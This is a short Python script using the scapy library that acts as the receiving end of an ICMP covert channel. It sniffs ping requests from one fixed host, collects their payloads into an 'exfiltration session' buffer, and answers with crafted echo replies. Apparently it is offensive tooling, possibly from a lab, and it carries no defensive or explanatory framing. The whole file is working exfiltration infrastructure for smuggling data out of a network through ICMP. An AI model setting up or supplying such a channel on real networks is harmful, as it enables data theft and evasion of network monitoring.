#!/usr/bin/env python3
from scapy.all import *
# Ref: https://scapy.readthedocs.io/en/latest/api/scapy.layers.inet.html

data = bytes()

def icmp_reply(pkt):
    global data
    if ICMP in pkt and pkt[ICMP].type == 8:
        print("[+] Received:")
        pkt.show2()

        load = pkt[Raw].load
        seq = pkt[ICMP].seq

        # Beginning of new exfiltration session
        if seq == 1:
            data = bytes()

        data += load
        print(data)

        ip = IP(src=pkt[IP].dst, dst = pkt[IP].src, ihl = pkt[IP].ihl)
        icmp = ICMP(type = 0, id = pkt[ICMP].id, seq = pkt[ICMP].seq + 1)

        resp_pkt = ip/icmp/load
        send(resp_pkt)

sending_host = "192.168.22.89"
pkt = sniff(filter=f"icmp and src host {sending_host}", prn=icmp_reply)
print(data)
